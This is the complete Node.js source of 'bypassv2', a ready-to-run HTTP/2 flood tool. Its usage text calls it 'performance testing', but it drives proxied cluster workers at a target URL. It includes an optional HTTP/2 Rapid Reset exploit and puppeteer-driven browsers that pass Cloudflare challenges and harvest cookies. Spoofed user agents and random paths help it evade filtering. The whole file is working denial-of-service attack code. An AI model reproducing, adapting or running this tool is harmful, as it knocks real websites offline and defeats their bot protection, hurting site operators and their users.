//npm i hpack randomstring puppeteer-real-browser
const net = require("net");
const tls = require("tls");
const HPACK = require("hpack");
const cluster = require("cluster");
const randstr = require("randomstring");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const { exec } = require("child_process");
const { connect } = require("puppeteer-real-browser");
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);

const ra = () =>
  randstr.generate({
    length: 6,
    charset: "alphanumeric",
    capitalization: "lowercase",
  });

const args = process.argv;
const debugMode = process.argv.includes("--debug");
const resetEnabled = process.argv.includes("--reset");
const randPath = process.argv.includes("--randpath");
const shouldCloseSocket = args.includes("--close");
const browserIndex = args.indexOf("--browser");
const maxBrowsers =
  browserIndex !== -1 ? parseInt(args[browserIndex + 1]) || 5 : 5;
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];

// Browser pool management
let activeBrowsers = 0;
let browserQueue = [];
const cookieStore = new Map(); // Store cookies per proxy
const activeBrowserInstances = []; // Track all active browser instances

// Get worker ID for debug messages
const workerId = cluster.isMaster
  ? "MASTER"
  : cluster.worker
    ? `WORKER-${cluster.worker.id}`
    : "WORKER";

function showIntroductoryMessage() {
  console.log(`
bypassv2 - A powerful tool for performance testing and bypassing restrictions!

Usage:
  node bypassv2 <target> <time> <threads> <ratelimit> <proxyfile> [options]

Options:
  --debug       : Enable debug mode for detailed information.
  --reset       : Enable Rapid Reset V2 exploit.
  --randpath    : Use random paths for requests to bypass caching/filtering.
  --close       : Close socket upon receiving 429 status codes.
  --browser <N> : Max concurrent browsers for cloudflare bypass (default: 5).

Example:
  node bypassv2 http://example.com 60 100 1000 proxies.txt --debug
`);
}

if (!target || !time || !threads || !ratelimit || !proxyfile) {
  showIntroductoryMessage();
  process.exit(1);
}

const url = new URL(target);
const floodStatusCodes = {};
const bypassStatusCodes = {};
let blockedProxies = []; // Track blocked proxies
let shouldPrint = false;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

let custom_table = 65536;
let custom_window = 6291456;
let custom_update = 15663105;
let custom_header = 262144;

const mqfi9qjkf3i = fs
  .readFileSync(proxyfile, "utf-8")
  .split(/\r?\n/)
  .filter(Boolean);

function encodeSettings(settings) {
  const buffer = Buffer.alloc(settings.length * 6);
  settings.forEach(([id, value], index) => {
    buffer.writeUInt16BE(id, index * 6);
    buffer.writeUInt32BE(value, index * 6 + 2);
  });
  return buffer;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
  const frame = Buffer.alloc(9);
  frame.writeUIntBE(payload.length, 0, 3);
  frame.writeUInt8(type, 3);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload) return Buffer.concat([frame, payload]);
  return frame;
}

function decodeFrame(buffer) {
  if (buffer.length < 9) return null;
  const length = buffer.readUIntBE(0, 3);
  const type = buffer.readUInt8(3);
  const flags = buffer.readUInt8(4);
  const streamId = buffer.readUInt32BE(5) & 0x7fffffff;
  if (buffer.length < 9 + length) return null;
  return {
    length,
    type,
    flags,
    streamId,
    payload: buffer.subarray(9, 9 + length),
  };
}

let headersPerReset = 0;

function printStatusCodes() {
  if (shouldPrint) {
    const floodStats = JSON.stringify(floodStatusCodes);
    const bypassStats = JSON.stringify(bypassStatusCodes);

    console.log(
      `[STATUS][${workerId}] Flood: ${floodStats} | Bypass: ${bypassStats}`,
    );

    shouldPrint = false;
    // Reset counters
    for (const code in floodStatusCodes) {
      floodStatusCodes[code] = 0;
    }
    for (const code in bypassStatusCodes) {
      bypassStatusCodes[code] = 0;
    }
  }
}

setInterval(printStatusCodes, 1000);

// Function to launch browser for CloudFlare bypass
async function launchBypassBrowser(proxy) {
  activeBrowsers++;
  console.log(
    `[BROWSER][${workerId}] Starting bypass (${activeBrowsers}/${maxBrowsers}): ${proxy
      .split(":")
      .slice(0, 2)
      .join(":")}`,
  );

  let browser;
  let isClosed = false;

  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => {
      isClosed = true;
      reject(new Error("Timeout 60s"));
    }, 60000);
  });

  const launchPromise = (async () => {
    try {
      let proxyAddress = "";
      let proxyUser = null;
      let proxyPass = null;

      const proxyParts = proxy.split(":");
      if (proxyParts.length === 2) {
        proxyAddress = `${proxyParts[0]}:${proxyParts[1]}`;
      } else if (proxyParts.length === 4) {
        proxyAddress = `${proxyParts[0]}:${proxyParts[1]}`;
        proxyUser = proxyParts[2];
        proxyPass = proxyParts[3];
      }

      const androidVersions = [
        "8.1.0",
        "9",
        "10",
        "11",
        "12",
        "12.1",
        "13",
        "14",
      ];

      const chromeVersions = [
        "120.0.6099.230",
        "121.0.6167.101",
        "122.0.6261.94",
        "123.0.6312.86",
        "124.0.6367.113",
        "125.0.6422.76",
        "126.0.6478.61",
        "127.0.6533.72",
        "128.0.6613.146",
        "129.0.6668.100",
        "130.0.6723.117",
        "131.0.6778.86",
      ];

      const devices = [
        "Pixel 6",
        "Pixel 6 Pro",
        "Pixel 7",
        "Pixel 7 Pro",
        "Pixel 8",
        "Pixel 8 Pro",
        "Pixel 5",
        "SM-G991B", // Galaxy S21
        "SM-G996B", // Galaxy S21+
        "SM-S901B", // Galaxy S22
        "SM-S906B", // Galaxy S22+
        "SM-S908B", // Galaxy S22 Ultra
        "SM-S916B", // Galaxy S23+
        "SM-S918B", // Galaxy S23 Ultra
        "SM-S921B", // Galaxy S24
        "SM-S926B", // Galaxy S24+
        "SM-S928B", // Galaxy S24 Ultra
        "SM-A346B", // Galaxy A34
        "SM-A546B", // Galaxy A54
        "SM-A146B", // Galaxy A14
        "Redmi Note 12",
        "Redmi Note 13",
        "Xiaomi 12",
        "Xiaomi 12 Pro",
        "Xiaomi 13",
        "Xiaomi 13 Pro",
        "Mi 11",
        "POCO X5",
        "POCO M5",
        "OnePlus 9",
        "OnePlus 10 Pro",
        "OnePlus 10T",
        "OnePlus 11",
        "Vivo X80",
        "Vivo X90",
        "Vivo Y21",
        "Realme 10",
        "Realme 11",
        "Oppo Find X5",
        "Oppo Find X6",
        "Moto G Power",
      ];

      const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
      const androidVersion = pick(androidVersions);
      const device = pick(devices);
      const chromeVersion = pick(chromeVersions);

      RANDOM_ANDROID = `Mozilla/5.0 (Linux; Android ${androidVersion}; ${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Mobile Safari/537.36`;

      const realBrowserOption = {
        args: [`--user-agent=${RANDOM_ANDROID}`],
        turnstile: true,
        headless: false,
        customConfig: {},
        connectOption: { defaultViewport: null },
        plugins: [],
      };

      if (proxyAddress) {
        realBrowserOption.args.push(`--proxy-server=${proxyAddress}`);
      }

      const { page, browser: b } = await connect(realBrowserOption);

      if (isClosed) {
        if (b) await b.close();
        return;
      }

      browser = b;
      activeBrowserInstances.push(browser);

      if (proxyUser && proxyPass) {
        await page.authenticate({ username: proxyUser, password: proxyPass });
      }

      await page.setUserAgent(RANDOM_ANDROID);
      await page.goto(target, {
        waitUntil: "domcontentloaded",
        timeout: 30000,
      });

      let verified = false;
      let startDate = Date.now();
      let blockedByCloudflare = false;

      while (!verified && Date.now() - startDate < 30000) {
        const title = await page.title();
        if (title === "Attention Required! | Cloudflare") {
          blockedByCloudflare = true;
          console.log(
            `[BROWSER][${workerId}] Blocked by Cloudflare | Proxy: ${proxy}`,
          );
          break;
        }
        if (title !== "Just a moment...") {
          verified = true;
        }
        await new Promise((r) => setTimeout(r, 1000));
      }

      // Only get cookies if not blocked by Cloudflare
      if (!blockedByCloudflare) {
        const cookies = await page.cookies();
        if (cookies && cookies.length > 0) {
          const cookieString = cookies
            .map((c) => `${c.name}=${c.value}`)
            .join("; ");

          cookieStore.set(proxy, {
            cookies: cookieString,
            userAgent: RANDOM_ANDROID,
            timestamp: Date.now(),
            requestCount: 0,
          });

          console.log(
            `[BROWSER][${workerId}] Cookies obtained for ${proxyAddress} | ${cookieString} | ${RANDOM_ANDROID}`,
          );
        } else {
          console.log(
            `[BROWSER][${workerId}] No cookies obtained for ${proxyAddress}`,
          );
        }
      }

      await browser.close();
      const index = activeBrowserInstances.indexOf(browser);
      if (index > -1) activeBrowserInstances.splice(index, 1);
    } catch (error) {
      console.error(`[BROWSER][${workerId}] Error: ${error.message}`);
    }
  })();

  try {
    await Promise.race([launchPromise, timeoutPromise]);
  } catch (error) {
    console.error(`[BROWSER][${workerId}] ${error.message}`);
    if (browser) {
      try {
        await browser.close();
      } catch (e) {}
    }
  } finally {
    activeBrowsers--;

    if (browserQueue.length > 0 && activeBrowsers < maxBrowsers) {
      const nextProxy = browserQueue.shift();
      launchBypassBrowser(nextProxy);
    }
  }
}

function requestBypass(proxy) {
  if (activeBrowsers < maxBrowsers) {
    launchBypassBrowser(proxy);
  } else {
    if (!browserQueue.includes(proxy)) {
      browserQueue.push(proxy);
    }
  }
}

function go() {
  var [proxyHost, proxyPort] = "";
  var proxyUser = null,
    proxyPass = null;
  const selectedProxy = mqfi9qjkf3i[~~(Math.random() * mqfi9qjkf3i.length)];
  const proxyParts = selectedProxy.split(":");
  if (proxyParts.length === 2) {
    [proxyHost, proxyPort] = proxyParts;
  } else if (proxyParts.length === 4) {
    [proxyHost, proxyPort, proxyUser, proxyPass] = proxyParts;
  } else {
    throw new Error("Invalid proxy format");
  }
  let SocketTLS;

  const netSocket = net
    .connect(Number(proxyPort), proxyHost, () => {
      if (proxyUser && proxyPass) {
        const authHeader = Buffer.from(`${proxyUser}:${proxyPass}`).toString(
          "base64",
        );
        netSocket.write(
          `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authHeader}\r\nProxy-Connection: Keep-Alive\r\n\r\n`,
        );
      } else {
        netSocket.write(
          `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`,
        );
      }
      netSocket.once("data", () => {
        SocketTLS = tls
          .connect(
            {
              socket: netSocket,
              ALPNProtocols: ["h2", "http/1.1"],
              servername: url.host,
              ciphers: [
                "TLS_AES_128_GCM_SHA256",
                "TLS_AES_256_GCM_SHA384",
                "TLS_CHACHA20_POLY1305_SHA256",
                "ECDHE-ECDSA-AES128-GCM-SHA256",
                "ECDHE-RSA-AES128-GCM-SHA256",
                "ECDHE-ECDSA-AES256-GCM-SHA384",
                "ECDHE-RSA-AES256-GCM-SHA384",
                "ECDHE-ECDSA-CHACHA20-POLY1305",
                "ECDHE-RSA-CHACHA20-POLY1305",
                "ECDHE-RSA-AES128-SHA",
                "ECDHE-RSA-AES256-SHA",
                "AES128-GCM-SHA256",
                "AES256-GCM-SHA384",
                "AES128-SHA",
                "AES256-SHA",
              ].join(":"),
              honorCipherOrder: true,
              minVersion: "TLSv1.2",
              maxVersion: "TLSv1.3",
              secureOptions:
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_COMPRESSION,
              sessionIdContext: "leakdev",
              requestCert: false,
              rejectUnauthorized: false,
            },
            () => {
              let streamId = 1;
              let data = Buffer.alloc(0);
              let hpack = new HPACK();
              hpack.setTableSize(4096);

              const updateWindow = Buffer.alloc(4);
              updateWindow.writeUInt32BE(custom_update, 0);

              const frames = [
                Buffer.from(PREFACE, "binary"),
                encodeFrame(
                  0,
                  4,
                  encodeSettings([
                    [1, custom_header],
                    [2, 0],
                    [3, custom_window],
                    [4, custom_window],
                    [6, custom_table],
                  ]),
                ),
                encodeFrame(0, 8, updateWindow),
              ];

              SocketTLS.on("data", (eventData) => {
                data = Buffer.concat([data, eventData]);
                while (data.length >= 9) {
                  const frame = decodeFrame(data);
                  if (frame != null) {
                    data = data.subarray(frame.length + 9);
                    if (frame.type === 1) {
                      const headers = hpack.decode(frame.payload);
                      const statusCodeHeader = headers.find(
                        (header) => header[0] === ":status",
                      );
                      if (statusCodeHeader) {
                        const statusCode = parseInt(statusCodeHeader[1], 10);
                        shouldPrint = true;

                        // Track status codes separately for flood and bypass
                        const bypassData = cookieStore.get(selectedProxy);
                        if (bypassData && bypassData.cookies) {
                          // This is a bypass request
                          bypassStatusCodes[statusCode] =
                            (bypassStatusCodes[statusCode] || 0) + 1;
                        } else {
                          // This is a flood request
                          floodStatusCodes[statusCode] =
                            (floodStatusCodes[statusCode] || 0) + 1;
                        }

                        if (statusCode === 403) {
                          const oldCookie = cookieStore.get(selectedProxy);
                          const proxyDisplay = selectedProxy
                            .split(":")
                            .slice(0, 2)
                            .join(":");

                          if (oldCookie) {
                            if (debugMode) {
                              console.log(
                                `[403][${workerId}] Cookie expired after ${oldCookie.requestCount} requests | Proxy: ${proxyDisplay}`,
                              );
                            }
                            blockedProxies.push(proxyDisplay);
                          } else {
                            blockedProxies.push(proxyDisplay);
                          }

                          cookieStore.delete(selectedProxy);
                          requestBypass(selectedProxy);

                          SocketTLS.end(() => {
                            SocketTLS.destroy();
                            go();
                          });
                        } else if (statusCode === 429) {
                          const oldCookie = cookieStore.get(selectedProxy);
                          const proxyDisplay = selectedProxy
                            .split(":")
                            .slice(0, 2)
                            .join(":");

                          if (oldCookie && debugMode) {
                            console.log(
                              `[429][${workerId}] Rate limited after ${oldCookie.requestCount} requests | Proxy: ${proxyDisplay}`,
                            );
                          }

                          blockedProxies.push(proxyDisplay);
                          cookieStore.delete(selectedProxy);
                          //requestBypass(selectedProxy);

                          if (shouldCloseSocket) {
                            SocketTLS.end(() => {
                              SocketTLS.destroy();
                              go();
                            });
                          }
                        }
                      }
                    }
                    if (frame.type === 4 && frame.flags === 0) {
                      SocketTLS.write(encodeFrame(0, 4, "", 1));
                    }
                    if (frame.type === 7 || frame.type === 5) {
                      SocketTLS.end(() => SocketTLS.destroy());
                    }
                  } else {
                    break;
                  }
                }
              });

              SocketTLS.write(Buffer.concat(frames));

              function main() {
                if (SocketTLS.destroyed) {
                  return;
                }

                const chromeVersions = [
                  { version: "131", build: "0.6778.86" },
                  { version: "131", build: "0.6778.69" },
                  { version: "130", build: "0.6723.117" },
                  { version: "129", build: "0.6668.100" },
                ];
                const chrome =
                  chromeVersions[
                    Math.floor(Math.random() * chromeVersions.length)
                  ];

                const randomPath = randPath ? `/${ra()}` : url.pathname;
                const queryParams = randPath
                  ? `?${ra()}=${ra()}`
                  : url.search || "";

                const languages = [
                  "en-US,en;q=0.9",
                  "en-GB,en;q=0.9,en-US;q=0.8",
                  "en-US,en;q=0.9,vi;q=0.8",
                  "en-US,en;q=0.9,zh-CN;q=0.8",
                ];
                const selectedLang =
                  languages[Math.floor(Math.random() * languages.length)];

                const brands = [
                  `"Google Chrome";v="${chrome.version}", "Chromium";v="${chrome.version}", "Not?A_Brand";v="24"`,
                  `"Chromium";v="${chrome.version}", "Google Chrome";v="${chrome.version}", "Not?A_Brand";v="24"`,
                  `"Not?A_Brand";v="24", "Chromium";v="${chrome.version}", "Google Chrome";v="${chrome.version}"`,
                ];
                const selectedBrand =
                  brands[Math.floor(Math.random() * brands.length)];

                const cacheControls = [
                  "max-age=0",
                  "no-cache",
                  "max-age=0, must-revalidate",
                ];
                const cacheControl =
                  cacheControls[
                    Math.floor(Math.random() * cacheControls.length)
                  ];

                const bypassData = cookieStore.get(selectedProxy);
                let userAgentToUse = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chrome.build} Safari/537.36`;

                if (bypassData) {
                  userAgentToUse = bypassData.userAgent;
                  bypassData.requestCount++;
                }

                const headers = [
                  [":method", "GET"],
                  [":authority", url.hostname],
                  [":scheme", "https"],
                  [":path", randomPath + queryParams],
                  ["cache-control", cacheControl],
                  ["sec-ch-ua", selectedBrand],
                  ["sec-ch-ua-mobile", "?0"],
                  ["sec-ch-ua-platform", '"Windows"'],
                  ["upgrade-insecure-requests", "1"],
                  ["user-agent", userAgentToUse],
                  [
                    "accept",
                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                  ],
                  ["sec-fetch-site", "none"],
                  ["sec-fetch-mode", "navigate"],
                  ["sec-fetch-user", "?1"],
                  ["sec-fetch-dest", "document"],
                  ["accept-encoding", "gzip, deflate, br, zstd"],
                  ["accept-language", selectedLang],
                ];

                if (bypassData && bypassData.cookies) {
                  headers.push(["cookie", bypassData.cookies]);
                }

                if (Math.random() < 0.3) {
                  headers.splice(4, 0, ["referer", `https://${url.hostname}/`]);
                }

                if (Math.random() < 0.2) {
                  headers.push(["priority", "u=0, i"]);
                }

                const combinedHeaders = headers;

                const packed = Buffer.concat([
                  Buffer.from([0x80, 0, 0, 0, 0xff]),
                  hpack.encode(combinedHeaders),
                ]);

                SocketTLS.write(
                  Buffer.concat([
                    encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20),
                  ]),
                );
                if (resetEnabled) {
                  headersPerReset++;
                  if (headersPerReset >= 2) {
                    SocketTLS.write(
                      encodeFrame(
                        streamId,
                        3,
                        Buffer.from([0x0, 0x0, 0x8, 0x0]),
                        0,
                      ),
                    );
                    headersPerReset = 0;
                  }
                }
                streamId += 2;
                setTimeout(() => {
                  main();
                }, 1000 / ratelimit);
              }

              main();
            },
          )
          .on("error", () => {
            SocketTLS.destroy();
          });
      });
    })
    .once("error", () => {})
    .once("close", () => {
      if (SocketTLS) {
        SocketTLS.end(() => {
          SocketTLS.destroy();
          go();
        });
      }
    });
}

if (cluster.isMaster) {
  console.log(`[INFO] HTTP-BYPASS V2 starting...`);
  console.log(`[INFO] Target: ${target}`);
  console.log(`[INFO] Duration: ${time} seconds`);
  console.log(`[INFO] Threads: ${threads}`);
  console.log(`[INFO] Proxy file: ${proxyfile}`);
  console.log(`[OPTIONS] Debug Mode: ${debugMode ? "ON" : "OFF"}`);
  console.log("[OPTIONS] Rapid Reset V2 Enabled:", resetEnabled);
  console.log("[OPTIONS] Random Path Enabled:", randPath);
  console.log("[OPTIONS] Close Socket on 403/429 Enabled:", shouldCloseSocket);
  console.log("[OPTIONS] Max Concurrent Browsers:", maxBrowsers);
  Array.from({ length: threads }, (_, i) =>
    cluster.fork({ core: i % os.cpus().length }),
  );
  cluster.on("exit", (worker) => {
    cluster.fork({ core: worker.id % os.cpus().length });
  });
  setTimeout(() => process.exit(1), time * 1000);
} else {
  setInterval(go, 1);
  setTimeout(async () => {
    process.exit(1);
  }, time * 1000);
}

// Global cleanup handler
async function cleanupBrowsers() {
  for (const browser of activeBrowserInstances) {
    if (browser) {
      try {
        await browser.close();
      } catch (e) {}
    }
  }
}

process.on("exit", () => {
  // Synchronous cleanup if possible, but puppeteer close is async.
  // We rely on signal handlers for async cleanup.
});

process.on("SIGINT", async () => {
  await cleanupBrowsers();
  process.exit();
});

process.on("SIGTERM", async () => {
  await cleanupBrowsers();
  process.exit();
});
